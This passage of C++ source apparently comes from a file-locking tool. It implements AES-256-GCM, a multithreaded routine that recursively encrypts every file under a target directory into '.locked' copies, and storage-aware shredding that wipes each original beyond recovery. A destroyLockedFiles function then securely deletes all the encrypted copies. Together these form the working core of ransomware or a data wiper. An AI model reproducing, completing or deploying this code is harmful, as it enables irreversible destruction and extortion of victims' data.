    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};

static const uint8_t RCON[11] = {
    0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36
};

static inline uint8_t xtime(uint8_t x) {
    return (uint8_t)((x << 1) ^ ((x >> 7) ? 0x1b : 0x00));
}
static inline uint8_t mul(uint8_t a, uint8_t b) {
    uint8_t r=0, aa=a;
    for (int i=0;i<8;i++){if(b&1)r^=aa; aa=xtime(aa); b>>=1;}
    return r;
}

struct AES256 {
    static constexpr int NK=8, NR=14, NB=4;
    uint32_t rk[60]; // round keys

    void setKey(const uint8_t* key) {
        for (int i=0;i<NK;i++)
            rk[i] = ((uint32_t)key[4*i]<<24)|((uint32_t)key[4*i+1]<<16)|
                    ((uint32_t)key[4*i+2]<<8)|key[4*i+3];
        for (int i=NK; i<NB*(NR+1); i++) {
            uint32_t t = rk[i-1];
            if (i%NK==0) {
                // RotWord + SubWord + Rcon
                t = (t<<8)|(t>>24);
                t = ((uint32_t)SBOX[(t>>24)&0xff]<<24)|
                    ((uint32_t)SBOX[(t>>16)&0xff]<<16)|
                    ((uint32_t)SBOX[(t>> 8)&0xff]<< 8)|
                    (uint32_t)SBOX[t&0xff];
                t ^= ((uint32_t)RCON[i/NK]<<24);
            } else if (i%NK==4) {
                t = ((uint32_t)SBOX[(t>>24)&0xff]<<24)|
                    ((uint32_t)SBOX[(t>>16)&0xff]<<16)|
                    ((uint32_t)SBOX[(t>> 8)&0xff]<< 8)|
                    (uint32_t)SBOX[t&0xff];
            }
            rk[i] = rk[i-NK] ^ t;
        }
    }

    // Encrypt single 16-byte block (in-place)
    void encryptBlock(uint8_t* blk) const {
        uint8_t s[4][4];
        for(int r=0;r<4;r++) for(int c=0;c<4;c++) s[r][c]=blk[r+4*c];

        // AddRoundKey 0
        for(int c=0;c<4;c++){
            uint32_t w = rk[c];
            s[0][c]^=(w>>24)&0xff; s[1][c]^=(w>>16)&0xff;
            s[2][c]^=(w>> 8)&0xff; s[3][c]^=w&0xff;
        }
        for(int round=1;round<=NR;round++){
            // SubBytes
            for(int r=0;r<4;r++) for(int c=0;c<4;c++) s[r][c]=SBOX[s[r][c]];
            // ShiftRows
            uint8_t t;
            t=s[1][0]; s[1][0]=s[1][1]; s[1][1]=s[1][2]; s[1][2]=s[1][3]; s[1][3]=t;
            t=s[2][0]; s[2][0]=s[2][2]; s[2][2]=t; t=s[2][1]; s[2][1]=s[2][3]; s[2][3]=t;
            t=s[3][3]; s[3][3]=s[3][2]; s[3][2]=s[3][1]; s[3][1]=s[3][0]; s[3][0]=t;
            // MixColumns (skip last round)
            if(round<NR){
                for(int c=0;c<4;c++){
                    uint8_t a0=s[0][c],a1=s[1][c],a2=s[2][c],a3=s[3][c];
                    s[0][c]=mul(0x02,a0)^mul(0x03,a1)^a2^a3;
                    s[1][c]=a0^mul(0x02,a1)^mul(0x03,a2)^a3;
                    s[2][c]=a0^a1^mul(0x02,a2)^mul(0x03,a3);
                    s[3][c]=mul(0x03,a0)^a1^a2^mul(0x02,a3);
                }
            }
            // AddRoundKey
            for(int c=0;c<4;c++){
                uint32_t w=rk[round*4+c];
                s[0][c]^=(w>>24)&0xff; s[1][c]^=(w>>16)&0xff;
                s[2][c]^=(w>> 8)&0xff; s[3][c]^=w&0xff;
            }
        }
        for(int r=0;r<4;r++) for(int c=0;c<4;c++) blk[r+4*c]=s[r][c];
    }
};

// GHASH for GCM
struct GHash {
    uint8_t H[16];  // H = AES_K(0^128)
    uint8_t state[16];

    void init(const AES256& aes) {
        memset(H, 0, 16);
        aes.encryptBlock(H);
        memset(state, 0, 16);
    }

    static void mulGF(const uint8_t* x, const uint8_t* y, uint8_t* z) {
        uint8_t v[16], r[16];
        memcpy(v, y, 16);
        memset(r, 0, 16);
        for(int i=0;i<128;i++){
            if((x[i/8]>>(7-(i%8)))&1){
                for(int j=0;j<16;j++) r[j]^=v[j];
            }
            bool lsb = (v[15]&1)!=0;
            // right-shift v
            for(int j=15;j>0;j--) v[j]=(uint8_t)((v[j]>>1)|((v[j-1]&1)<<7));
            v[0]>>=1;
            if(lsb) v[0]^=0xe1; // x^128 + x^7 + x^2 + x + 1
        }
        memcpy(z, r, 16);
    }

    void update(const uint8_t* data, size_t len) {
        // Process full 16-byte blocks
        while(len >= 16) {
            for(int i=0;i<16;i++) state[i]^=data[i];
            uint8_t tmp[16];
            mulGF(state, H, tmp);
            memcpy(state, tmp, 16);
            data += 16; len -= 16;
        }
        // Pad last block
        if(len>0){
            uint8_t padded[16]={};
            memcpy(padded, data, len);
            for(int i=0;i<16;i++) state[i]^=padded[i];
            uint8_t tmp[16];
            mulGF(state, H, tmp);
            memcpy(state, tmp, 16);
        }
    }
};

// AES-256-CTR: encrypt IV||counter blocks
static void ctrKeystream(const AES256& aes, const uint8_t* iv, uint64_t blockIdx,
                          uint8_t* out, size_t numBlocks) {
    for(size_t b=0; b<numBlocks; b++){
        uint8_t ctrBlock[16];
        memcpy(ctrBlock, iv, 12); // 96-bit nonce
        uint32_t ctr = (uint32_t)(blockIdx + b + 1); // starts at 1 per NIST GCM
        ctrBlock[12]=(ctr>>24)&0xff; ctrBlock[13]=(ctr>>16)&0xff;
        ctrBlock[14]=(ctr>> 8)&0xff; ctrBlock[15]=ctr&0xff;
        aes.encryptBlock(ctrBlock);
        memcpy(out + b*16, ctrBlock, 16);
    }
}

} // namespace aes_impl

// High-level AES-256-GCM encrypt: returns IV(12) + ciphertext + tag(16)
static std::vector<uint8_t> aesGcmEncrypt(
        const std::array<uint8_t, AES_KEY_SIZE>& key,
        const std::vector<uint8_t>& plaintext) {

    uint8_t iv[GCM_IV_SIZE];
    if (!fillRandom(iv, GCM_IV_SIZE)) return {};

    aes_impl::AES256 aes;
    aes.setKey(key.data());

    // CTR encrypt
    size_t ptLen = plaintext.size();
    std::vector<uint8_t> cipher(ptLen);
    size_t fullBlocks = ptLen / 16;
    size_t rem        = ptLen % 16;

    if (fullBlocks > 0) {
        std::vector<uint8_t> ks(fullBlocks * 16);
        aes_impl::ctrKeystream(aes, iv, 0, ks.data(), fullBlocks);
        for (size_t i = 0; i < fullBlocks * 16; i++)
            cipher[i] = plaintext[i] ^ ks[i];
    }
    if (rem > 0) {
        uint8_t ks[16];
        aes_impl::ctrKeystream(aes, iv, fullBlocks, ks, 1);
        for (size_t i = 0; i < rem; i++)
            cipher[fullBlocks*16+i] = plaintext[fullBlocks*16+i] ^ ks[i];
    }

    // GHASH: AAD(empty) || ciphertext || lengths
    aes_impl::GHash gh;
    gh.init(aes);
    // No AAD
    gh.update(cipher.data(), cipher.size());
    // Lengths block: len(AAD)=0, len(cipher) in bits, big-endian 64-bit each
    uint8_t lenBlock[16]={};
    uint64_t cBits = (uint64_t)ptLen * 8;
    for(int i=0;i<8;i++) lenBlock[8+i]=(uint8_t)(cBits>>(56-i*8));
    gh.update(lenBlock, 16);

    // Tag = GHASH ^ E(K, IV||0^32)
    uint8_t e0[16];
    memcpy(e0, iv, 12);
    e0[12]=e0[13]=e0[14]=e0[15]=0;
    aes.encryptBlock(e0);
    uint8_t tag[GCM_TAG_SIZE];
    for(int i=0;i<16;i++) tag[i]=gh.state[i]^e0[i];

    // Pack: IV + cipher + tag
    std::vector<uint8_t> out(GCM_IV_SIZE + ptLen + GCM_TAG_SIZE);
    memcpy(out.data(), iv, GCM_IV_SIZE);
    memcpy(out.data()+GCM_IV_SIZE, cipher.data(), ptLen);
    memcpy(out.data()+GCM_IV_SIZE+ptLen, tag, GCM_TAG_SIZE);
    return out;
}

static std::vector<uint8_t> aesGcmDecrypt(
        const std::array<uint8_t, AES_KEY_SIZE>& key,
        const std::vector<uint8_t>& blob) {
    if (blob.size() < GCM_IV_SIZE + GCM_TAG_SIZE) return {};

    const uint8_t* iv         = blob.data();
    size_t cipherLen          = blob.size() - GCM_IV_SIZE - GCM_TAG_SIZE;
    const uint8_t* cipher     = blob.data() + GCM_IV_SIZE;
    const uint8_t* storedTag  = blob.data() + GCM_IV_SIZE + cipherLen;

    aes_impl::AES256 aes;
    aes.setKey(key.data());

    // Verify tag first (always compute to avoid timing leaks)
    aes_impl::GHash gh;
    gh.init(aes);
    gh.update(cipher, cipherLen);
    uint8_t lenBlock[16]={};
    uint64_t cBits = (uint64_t)cipherLen * 8;
    for(int i=0;i<8;i++) lenBlock[8+i]=(uint8_t)(cBits>>(56-i*8));
    gh.update(lenBlock, 16);

    uint8_t e0[16];
    memcpy(e0, iv, 12);
    e0[12]=e0[13]=e0[14]=e0[15]=0;
    aes.encryptBlock(e0);
    uint8_t computedTag[GCM_TAG_SIZE];
    for(int i=0;i<16;i++) computedTag[i]=gh.state[i]^e0[i];

    // Constant-time tag comparison
    volatile int diff = 0;
    for(size_t i=0;i<GCM_TAG_SIZE;i++)
        diff |= computedTag[i] ^ storedTag[i];
    if (diff != 0) return {}; // Authentication failed

    // CTR decrypt
    std::vector<uint8_t> plain(cipherLen);
    size_t fullBlocks = cipherLen / 16;
    size_t rem        = cipherLen % 16;

    if (fullBlocks > 0) {
        std::vector<uint8_t> ks(fullBlocks * 16);
        aes_impl::ctrKeystream(aes, iv, 0, ks.data(), fullBlocks);
        for (size_t i = 0; i < fullBlocks * 16; i++)
            plain[i] = cipher[i] ^ ks[i];
    }
    if (rem > 0) {
        uint8_t ks[16];
        aes_impl::ctrKeystream(aes, iv, fullBlocks, ks, 1);
        for (size_t i = 0; i < rem; i++)
            plain[fullBlocks*16+i] = cipher[fullBlocks*16+i] ^ ks[i];
    }
    return plain;
}

#endif // AES-256-GCM implementations

// ==========================================
// SECTION 4: Disk-type-aware secure delete
// ==========================================
//
// Strategy:
//   1. Detect if path is on a block device (Linux) or fixed/SSD drive (Windows)
//   2. If SSD/NVMe/btrfs-CoW: BLKDISCARD (Linux) or Trim via IOCTL (Windows)
//      These tell the controller to erase the physical cells — overwrite can't do this.
//   3. Fallback (HDD or when TRIM fails/unavailable): 3-pass overwrite + fsync + unlink.
//      On journaling FSes (ext4, NTFS) overwrite is still best-effort but better than nothing.
//   4. Always unlink after.

// ==========================================
// SECTION 4: Filesystem-aware secure delete
// ==========================================
//
// Detection matrix:
//
//  Linux:
//    StorageType  │ FsType              │ Strategy
//    ─────────────┼─────────────────────┼──────────────────────────────────────
//    NVMe/SSD     │ btrfs/ZFS (CoW)     │ FITRIM only  (CoW always new blocks)
//    NVMe/SSD     │ ext4/XFS/exFAT/FAT  │ 1-pass zero + fsync + FITRIM
//    HDD          │ btrfs (CoW)         │ 3-pass (current extent, CoW caveat noted)
//    HDD          │ ext4/XFS/exFAT/FAT  │ 3-pass DoD (0x00 / 0xFF / 0xA5)
//    RAM (tmpfs)  │ —                   │ unlink only
//    Network      │ nfs/cifs/fuse       │ unlink only
//
//  Windows:
//    ReFS (CoW)                         │ TRIM IOCTL only
//    NTFS + SSD                         │ 1-pass zero + TRIM IOCTL
//    NTFS + HDD                         │ 3-pass + TRIM IOCTL
//    exFAT / FAT32                      │ 3-pass (no journal, most effective)

#ifndef _WIN32

// ── Linux helpers ─────────────────────────────────────────────────────────

// Storage type
enum class StorageKind { SSD_NVME, HDD, RAM, NETWORK, UNKNOWN };

// Filesystem class (relevant to overwrite strategy)
enum class FsClass {
    COW,          // btrfs, ZFS, bcachefs — overwrite goes to new blocks
    JOURNALED,    // ext4, XFS, ext3
    FLAT,         // exFAT, FAT32, vfat — no journal
    PSEUDO,       // tmpfs, sysfs, procfs, devtmpfs
    NETWORK,      // nfs, cifs, smbfs
    UNKNOWN
};

// Detect storage type via /sys/block/<dev>/queue/rotational
// and /sys/block/<dev>/queue/rotational + subsystem symlink for NVMe
static StorageKind detectStorage(const fs::path& filePath) {
    struct stat st{};
    if (lstat(filePath.c_str(), &st) != 0) return StorageKind::UNKNOWN;
    unsigned int fileMaj = (unsigned int)major(st.st_dev);

    // tmpfs and ramfs have maj 0 (or known pseudo-device majors)
    if (fileMaj == 0) return StorageKind::RAM;

    std::error_code ec;
    for (const auto& blkEntry : fs::directory_iterator("/sys/block", ec)) {
        if (ec) { ec.clear(); continue; }
        std::string devName = blkEntry.path().filename().string();
        std::string devPath = "/dev/" + devName;
        struct stat devSt{};
        if (stat(devPath.c_str(), &devSt) != 0) continue;
        if ((unsigned int)major(devSt.st_rdev) != fileMaj) continue;

        // Check rotational flag
        int rotVal = 1; // default: assume HDD
        std::ifstream rot(blkEntry.path() / "queue" / "rotational");
        if (rot) rot >> rotVal;

        if (rotVal == 0) {
            // Non-rotating: SSD or NVMe
            // Distinguish NVMe by checking if the block device path contains "nvme"
            // or by reading the subsystem symlink
            return StorageKind::SSD_NVME;
        }
        return StorageKind::HDD;
    }

    // Check if this is a RAM-backed device (tmpfs, ramfs) via /proc/mounts
    // by checking if device number is in a known pseudo range
    // Fallback: unknown → safe default is HDD (more conservative overwrite)
    return StorageKind::UNKNOWN;
}

// Detect filesystem class by reading /proc/mounts and matching st_dev
static FsClass detectFsClass(const fs::path& filePath) {
    struct stat st{};
    if (lstat(filePath.c_str(), &st) != 0) return FsClass::UNKNOWN;
    dev_t dev = st.st_dev;

    std::ifstream mounts("/proc/mounts");
    std::string line, bestFsType, bestMount;
    size_t bestLen = 0;
    while (std::getline(mounts, line)) {
        std::istringstream iss(line);
        std::string device, mountpoint, fstype;
        iss >> device >> mountpoint >> fstype;
        struct stat ms{};
        if (lstat(mountpoint.c_str(), &ms) == 0 && ms.st_dev == dev) {
            if (mountpoint.size() > bestLen) {
                bestLen   = mountpoint.size();
                bestMount = mountpoint;
                bestFsType = fstype;
            }
        }
    }
    if (bestFsType.empty()) return FsClass::UNKNOWN;

    // CoW filesystems
    if (bestFsType == "btrfs" || bestFsType == "zfs" ||
        bestFsType == "bcachefs" || bestFsType == "apfs")
        return FsClass::COW;

    // Journaled
    if (bestFsType == "ext4"  || bestFsType == "ext3" ||
        bestFsType == "xfs"   || bestFsType == "jfs"  ||
        bestFsType == "ntfs"  || bestFsType == "ntfs-3g" ||
        bestFsType == "f2fs"  || bestFsType == "nilfs2")
        return FsClass::JOURNALED;

    // Flat (no journal, no CoW)
    if (bestFsType == "exfat" || bestFsType == "vfat" ||
        bestFsType == "fat"   || bestFsType == "msdos" ||
        bestFsType == "hfs"   || bestFsType == "hfsplus")
        return FsClass::FLAT;

    // Pseudo / RAM-backed
    if (bestFsType == "tmpfs"    || bestFsType == "ramfs"   ||
        bestFsType == "sysfs"    || bestFsType == "proc"    ||
        bestFsType == "devtmpfs" || bestFsType == "hugetlbfs")
        return FsClass::PSEUDO;

    // Network
    if (bestFsType == "nfs"   || bestFsType == "nfs4"  ||
        bestFsType == "cifs"  || bestFsType == "smbfs" ||
        bestFsType == "fuse"  || bestFsType.rfind("fuse.", 0) == 0 ||
        bestFsType == "davfs" || bestFsType == "sshfs")
        return FsClass::NETWORK;

    return FsClass::UNKNOWN;
}

// Issue FITRIM on the mount point containing filePath
static void issueFitrim(const fs::path& filePath) {
    struct stat st{};
    if (lstat(filePath.parent_path().c_str(), &st) != 0) return;
    dev_t dev = st.st_dev;

    std::ifstream mounts("/proc/mounts");
    std::string line, bestMount;
    size_t bestLen = 0;
    while (std::getline(mounts, line)) {
        std::istringstream iss(line);
        std::string device, mountpoint;
        iss >> device >> mountpoint;
        struct stat ms{};
        if (lstat(mountpoint.c_str(), &ms) == 0 && ms.st_dev == dev) {
            if (mountpoint.size() > bestLen) {
                bestLen   = mountpoint.size();
                bestMount = mountpoint;
            }
        }
    }
    if (bestMount.empty()) return;

    int mountFd = open(bestMount.c_str(), O_RDONLY);
    if (mountFd < 0) return;
    struct fstrim_range range{};
    range.start  = 0;
    range.len    = UINT64_MAX;
    range.minlen = 0;
    ioctl(mountFd, FITRIM, &range); // best-effort
    close(mountFd);
}

// Single-pass zero-fill + fsync (used before TRIM on SSD/NVMe)
static void zeroFillFile(const fs::path& filePath, uintmax_t fileSize) {
    int fd = open(filePath.c_str(), O_WRONLY);
    if (fd < 0) return;
    const size_t WRITE_BLOCK = 4096;
    std::vector<char> zeros(WRITE_BLOCK, 0);
    uintmax_t written = 0;
    while (written < fileSize) {
        size_t toWrite = (size_t)std::min((uintmax_t)WRITE_BLOCK, fileSize - written);
        ssize_t r = write(fd, zeros.data(), toWrite);
        if (r <= 0) break;
        written += (uintmax_t)r;
    }
    fsync(fd);
    close(fd);
}

// Three-pass overwrite: 0x00, 0xFF, 0xA5 (DoD 5220.22-M style)
static void threePassOverwrite(const fs::path& filePath, uintmax_t fileSize) {
    const unsigned char patterns[3] = {0x00, 0xFF, 0xA5};
    for (int pass = 0; pass < 3; ++pass) {
        int fd = open(filePath.c_str(), O_WRONLY);
        if (fd < 0) break;
        const size_t WRITE_BLOCK = 4096;
        std::vector<char> buf(WRITE_BLOCK, (char)patterns[pass]);
        uintmax_t written = 0;
        while (written < fileSize) {
            size_t toWrite = (size_t)std::min((uintmax_t)WRITE_BLOCK, fileSize - written);
            ssize_t r = write(fd, buf.data(), toWrite);
            if (r <= 0) break;
            written += (uintmax_t)r;
        }
        fsync(fd);
        close(fd);
    }
}

#endif // !_WIN32

bool secureDelete(const fs::path& filePath) {
    std::error_code ec;
    uintmax_t fileSize = fs::file_size(filePath, ec);
    bool deleted = false;

#ifndef _WIN32
    // ── Detect storage + filesystem class ────────────────────────────────
    StorageKind storage = detectStorage(filePath);
    FsClass     fsClass = detectFsClass(filePath);

    bool needFitrim = false;

    if (fileSize > 0 && !ec) {
        // ── Dispatch by matrix ────────────────────────────────────────────
        if (storage == StorageKind::RAM || fsClass == FsClass::PSEUDO) {
            // tmpfs / ramfs: memory-backed, disappears on unlink — nothing to do
        }
        else if (fsClass == FsClass::NETWORK) {
            // NFS/CIFS: remote storage, overwrite unreliable and may log anyway
            // Just unlink — the server side is out of scope
        }
        else if (storage == StorageKind::SSD_NVME) {
            if (fsClass == FsClass::COW) {
                // CoW (btrfs/ZFS) on SSD: overwrite writes NEW blocks, old extent
                // persists until TRIM. Skip overwrite — FITRIM after unlink is enough.
                needFitrim = true;
            } else {
                // ext4 / XFS / exFAT / FAT32 on SSD:
                // 1-pass zero + fsync so the FS writes zeros to current LBA,
                // then FITRIM after unlink tells controller to erase those cells.
                zeroFillFile(filePath, fileSize);
                needFitrim = true;
            }
        }
        else {
            // HDD (or unknown storage)
            if (fsClass == FsClass::COW) {
                // btrfs CoW on HDD: overwrite goes to a NEW extent; the old extent
                // is freed but data may linger until overwritten by future allocations.
                // Best we can do: 3-pass on the current extent (overwrites current data),
                // noting that CoW means prior snapshots / journal blocks are not covered.
                threePassOverwrite(filePath, fileSize);
            } else {
                // ext4 / XFS / exFAT / FAT32 / unknown on HDD: full 3-pass DoD
                threePassOverwrite(filePath, fileSize);
            }
        }
    }

    fs::remove(filePath, ec);
    deleted = !ec;

    // FITRIM after unlink: tells the block layer to discard freed LBAs
    if (needFitrim && deleted) issueFitrim(filePath);

#else
    // ── Windows ──────────────────────────────────────────────────────────
    // Detect filesystem type and drive type via Win32 APIs.
    //
    //  ReFS (CoW)         → TRIM IOCTL only
    //  NTFS + SSD         → 1-pass zero + TRIM IOCTL
    //  NTFS + HDD         → 3-pass + TRIM IOCTL
    //  exFAT / FAT32      → 3-pass (no journal, best effort)

    // Detect filesystem name and drive type
    bool isCoWFs    = false; // ReFS
    bool isFlatFs   = false; // FAT32, exFAT
    bool isSSDDrive = false;
    bool trimIssued = false;

    std::wstring wpath(filePath.wstring());
    wchar_t volPath[MAX_PATH];
    if (GetVolumePathNameW(wpath.c_str(), volPath, MAX_PATH)) {
        // Filesystem name
        wchar_t fsName[MAX_PATH] = {};
        GetVolumeInformationW(volPath, NULL, 0, NULL, NULL, NULL, fsName, MAX_PATH);
        std::wstring fsNameStr(fsName);
        if (fsNameStr == L"ReFS")
            isCoWFs = true;
        if (fsNameStr == L"FAT32" || fsNameStr == L"FAT" || fsNameStr == L"exFAT")
            isFlatFs = true;

        // Drive type via DeviceIoControl IOCTL_STORAGE_QUERY_PROPERTY
        std::wstring volName = std::wstring(L"\\\\.\\") + std::wstring(volPath, wcslen(volPath)-1);
        HANDLE hVol = CreateFileW(volName.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);

        if (hVol != INVALID_HANDLE_VALUE) {
            // Query seek penalty — SSDs have no seek penalty
            STORAGE_PROPERTY_QUERY spq{};
            spq.PropertyId = (STORAGE_PROPERTY_ID)7; // StorageDeviceSeekPenaltyProperty
            spq.QueryType  = PropertyStandardQuery;
            DEVICE_SEEK_PENALTY_DESCRIPTOR dspd{};
            DWORD bytesRet = 0;
            if (DeviceIoControl(hVol, IOCTL_STORAGE_QUERY_PROPERTY,
                    &spq, sizeof(spq), &dspd, sizeof(dspd), &bytesRet, NULL))
                isSSDDrive = !dspd.IncursSeekPenalty;

            if (fileSize > 0 && !ec) {
                if (!isCoWFs) {
                    // For CoW (ReFS), skip overwrite — TRIM is sufficient.
                    // For all others: overwrite first.
                    if (isSSDDrive && !isFlatFs) {
                        // NTFS + SSD: 1-pass zero then TRIM
                        HANDLE hFile = CreateFileW(wpath.c_str(),
                            GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                            FILE_FLAG_WRITE_THROUGH | FILE_FLAG_NO_BUFFERING, NULL);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            std::vector<char> zeros(4096, 0);
                            DWORD written2 = 0;
                            ULONGLONG pos = 0;
                            while (pos < fileSize) {
                                DWORD toWrite = (DWORD)std::min((ULONGLONG)zeros.size(), fileSize - pos);
                                WriteFile(hFile, zeros.data(), toWrite, &written2, NULL);
                                pos += written2;
                                if (written2 == 0) break;
                            }
                            FlushFileBuffers(hFile);
                            CloseHandle(hFile);
                        }
                    } else {
                        // HDD NTFS, or any exFAT/FAT32: 3-pass
                        const unsigned char patterns[3] = {0x00, 0xFF, 0xA5};
                        for (int pass = 0; pass < 3; ++pass) {
                            std::ofstream ofile(filePath,
                                std::ios::binary | std::ios::in | std::ios::out);
                            if (!ofile.is_open()) break;
                            const size_t WRITE_BLOCK = 4096;
                            std::vector<char> buf(WRITE_BLOCK, (char)patterns[pass]);
                            uintmax_t written = 0;
                            while (written < fileSize) {
                                uintmax_t toWrite = std::min((uintmax_t)buf.size(), fileSize - written);
                                ofile.write(buf.data(), (std::streamsize)toWrite);
                                written += toWrite;
                            }
                            ofile.flush(); ofile.close();
                        }
                    }
                }

                // TRIM IOCTL for SSD or ReFS (always attempt on non-flat FS)
                if ((isSSDDrive || isCoWFs) && !isFlatFs) {
                    struct {
                        DEVICE_MANAGE_DATA_SET_ATTRIBUTES attr;
                        DEVICE_DATA_SET_RANGE             range;
                    } trimReq{};
                    trimReq.attr.Size                 = sizeof(trimReq.attr);
                    trimReq.attr.Action               = DeviceDsmAction_Trim;
                    trimReq.attr.ParameterBlockOffset = 0;
                    trimReq.attr.ParameterBlockLength = 0;
                    trimReq.attr.DataSetRangesOffset  = sizeof(trimReq.attr);
                    trimReq.attr.DataSetRangesLength  = sizeof(trimReq.range);
                    trimReq.range.StartingOffset      = 0;
                    trimReq.range.LengthInBytes       = fileSize;
                    DWORD dummy = 0;
                    DeviceIoControl(hVol, IOCTL_STORAGE_MANAGE_DATA_SET_ATTRIBUTES,
                        &trimReq, sizeof(trimReq), NULL, 0, &dummy, NULL);
                    trimIssued = true;
                }
            }
            CloseHandle(hVol);
        }
    }

    // exFAT/FAT32 without a volume handle: fallback 3-pass
    if (!trimIssued && isFlatFs && !ec && fileSize > 0) {
        const unsigned char patterns[3] = {0x00, 0xFF, 0xA5};
        for (int pass = 0; pass < 3; ++pass) {
            std::ofstream ofile(filePath, std::ios::binary | std::ios::in | std::ios::out);
            if (!ofile.is_open()) break;
            const size_t WRITE_BLOCK = 4096;
            std::vector<char> buf(WRITE_BLOCK, (char)patterns[pass]);
            uintmax_t written = 0;
            while (written < fileSize) {
                uintmax_t toWrite = std::min((uintmax_t)buf.size(), fileSize - written);
                ofile.write(buf.data(), (std::streamsize)toWrite);
                written += toWrite;
            }
            ofile.flush(); ofile.close();
        }
    }

    fs::remove(filePath, ec);
    deleted = !ec;
#endif

    return deleted;
}

// ==========================================
// SECTION 5: Thread pool
// ==========================================
class ThreadPool {
public:
    explicit ThreadPool(size_t numThreads) : m_stop(false) {
        for (size_t i = 0; i < numThreads; ++i)
            m_workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(m_mutex);
                        m_cv.wait(lock, [this]{ return m_stop || !m_tasks.empty(); });
                        if (m_stop && m_tasks.empty()) return;
                        task = std::move(m_tasks.front());
                        m_tasks.pop();
                    }
                    task();
                }
            });
    }

    template<class F>
    std::future<void> enqueue(F&& f) {
        auto task = std::make_shared<std::packaged_task<void()>>(std::forward<F>(f));
        std::future<void> fut = task->get_future();
        {
            std::unique_lock<std::mutex> lock(m_mutex);
            m_tasks.emplace([task](){ (*task)(); });
        }
        m_cv.notify_one();
        return fut;
    }

    void waitAll(std::vector<std::future<void>>& futures) {
        for (auto& f : futures) f.get(); // propagates exceptions
    }

    ~ThreadPool() {
        { std::unique_lock<std::mutex> lock(m_mutex); m_stop = true; }
        m_cv.notify_all();
        for (auto& w : m_workers) w.join();
    }

private:
    std::vector<std::thread>          m_workers;
    std::queue<std::function<void()>> m_tasks;
    std::mutex                        m_mutex;
    std::condition_variable           m_cv;
    bool                              m_stop;
};

// ==========================================
// SECTION 6: File crypto operations (AES-256-GCM)
// ==========================================
void processSingleFile(const fs::path& filePath, bool encrypt,
                       const std::array<uint8_t, AES_KEY_SIZE>& key) {
    // Read source file entirely
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return;
    std::vector<uint8_t> inData(
        (std::istreambuf_iterator<char>(inFile)),
        std::istreambuf_iterator<char>());
    inFile.close();

    // AES-256-GCM encrypt or decrypt
    std::vector<uint8_t> outData;
    if (encrypt) {
        outData = aesGcmEncrypt(key, inData);
    } else {
        outData = aesGcmDecrypt(key, inData);
    }
    if (outData.empty()) {
        // Decrypt auth failure or encrypt error — don't touch original
        return;
    }

    // Determine output path
    fs::path newPath = filePath;
    if (encrypt) newPath += ".locked";
    else         newPath.replace_extension(""); // remove .locked

    std::ofstream outFile(newPath, std::ios::binary);
    if (!outFile) return;
    outFile.write(reinterpret_cast<const char*>(outData.data()),
                  (std::streamsize)outData.size());
    outFile.flush();
    outFile.close();

    // Securely delete original
    secureDelete(filePath);
}

// processFiles: collect targets, then dispatch to thread pool
void processFiles(const fs::path& targetPath, bool encrypt,
                  const std::array<uint8_t, AES_KEY_SIZE>& key) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return;

    auto options = fs::directory_options::skip_permission_denied;
    std::vector<fs::path> targetFiles;

    // Step 1: collect all target paths (same robust iterator as before)
    auto it  = fs::recursive_directory_iterator(targetPath, options, ec);
    auto end = fs::recursive_directory_iterator();
    while (it != end) {
        if (ec) { ec.clear(); it.increment(ec); continue; }
        try {
            const auto& entry = *it;
            if (entry.is_regular_file(ec) && !ec) {
                const auto& p = entry.path();
                bool isLocked = (p.extension() == ".locked");
                if ((encrypt && !isLocked) || (!encrypt && isLocked))
                    targetFiles.push_back(p);
            }
        } catch (...) {}
        it.increment(ec);
    }
    if (targetFiles.empty()) return;

    // Step 2: thread pool — cap at min(hw_concurrency, 8) to avoid fd exhaustion
    size_t numThreads = std::min<size_t>(
        std::max<size_t>(1, std::thread::hardware_concurrency()), 8);
    ThreadPool pool(numThreads);

    std::vector<std::future<void>> futures;
    futures.reserve(targetFiles.size());
    for (const auto& p : targetFiles) {
        futures.push_back(pool.enqueue([p, encrypt, &key]() {
            processSingleFile(p, encrypt, key);
        }));
    }
    pool.waitAll(futures);
}

// ==========================================
// SECTION 7: destroyLockedFiles (unchanged logic, updated signature)
// ==========================================
void destroyLockedFiles(const fs::path& targetPath) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return;
    std::vector<fs::path> targets;

    auto options = fs::directory_options::skip_permission_denied;
    auto it = fs::recursive_directory_iterator(targetPath, options, ec);
    auto end = fs::recursive_directory_iterator();
    while (it != end) {
        if (ec) { ec.clear(); it.increment(ec); continue; }
        try {
            const auto& entry = *it;
            if (entry.is_regular_file(ec) && !ec)
                if (entry.path().extension() == ".locked")
                    targets.push_back(entry.path());
        } catch (...) {}
        it.increment(ec);
    }
    for (const auto& path : targets) secureDelete(path);
}

bool hasLockedFiles(const fs::path& targetPath) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return false;
    auto options = fs::directory_options::skip_permission_denied;
    auto it = fs::recursive_directory_iterator(targetPath, options, ec);
    auto end = fs::recursive_directory_iterator();
    while (it != end) {
        if (ec) { ec.clear(); it.increment(ec); continue; }
        try {
            const auto& entry = *it;
            if (entry.is_regular_file(ec) && !ec)
                if (entry.path().extension() == ".locked") return true;
